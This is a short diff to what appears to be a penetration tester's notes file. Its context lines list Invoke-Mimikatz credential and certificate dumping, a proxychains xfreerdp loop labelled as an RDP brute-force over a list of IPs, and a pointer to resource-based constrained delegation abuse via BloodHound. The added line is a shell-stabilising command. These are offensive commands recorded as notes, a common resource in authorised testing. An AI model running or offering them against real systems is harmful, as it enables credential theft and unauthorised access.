@@ -17,3 +17,5 @@ Invoke-Mimikatz -DumpCreds/-DumpCerts
 for i in `cat ips1.txt`;do proxychains xfreerdp /u:'<user>' /p:'<pass>' /v:$i +clipboard /dynamic-resolution /tls-seclevel:0 /timeout:80000;done ***RDP Brute***
 
 For RBCD guide use WriteDACL in bloodhound 
+
+script -qc /bin/bash /dev/null
